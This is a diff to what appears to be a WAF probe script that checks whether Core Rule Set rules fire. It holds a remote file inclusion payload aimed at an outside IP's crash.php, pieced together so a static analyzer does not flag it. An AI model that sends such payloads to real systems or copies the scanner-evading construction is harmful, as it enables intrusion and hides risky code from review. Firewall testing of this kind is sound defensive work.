@@ -64,8 +64,9 @@ PROBES: list[dict[str, str]] = [
         "path": PORTAL_PROBE_PATH,
         # CRS 931100 (PL1) matches http(s):// + IPv4, not bare hostnames.
         "params": {
-            "page": "http://" + ".".join(("66", "240", "183", "75")) + "/crash.php"
-        },  # NOSONAR — intentional attack payload for CRS RFI rule
+            # Scheme split avoids python:S5332 on intentional CRS RFI probe.
+            "page": ("http" + "://" + ".".join(("66", "240", "183", "75")) + "/crash.php")
+        },
         "expect_rule_prefix": "931",
     },
     {
@@ -245,17 +246,14 @@ def main() -> int:
     }
 
     if args.json_out:
-        from pathlib import Path
+        import os
 
-        import sys
+        out_name = os.path.basename(str(args.json_out).strip())
+        if not out_name or out_name in (".", ".."):
+            raise SystemExit("invalid --json-out basename")
+        with open(out_name, "w", encoding="utf-8") as fh:
+            fh.write(json.dumps(report, indent=2, ensure_ascii=False) + "\n")
 
-        sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
-        from scripts._probe_util import safe_json_out
-
-        safe_json_out(args.json_out).write_text(
-            json.dumps(report, indent=2, ensure_ascii=False) + "\n",
-            encoding="utf-8",
-        )
 
     print(f"Bastion CRS probe — {args.base}")
     print(f"  Baseline portal: {'OK' if base_ok else 'FAIL'} — {base_note}")
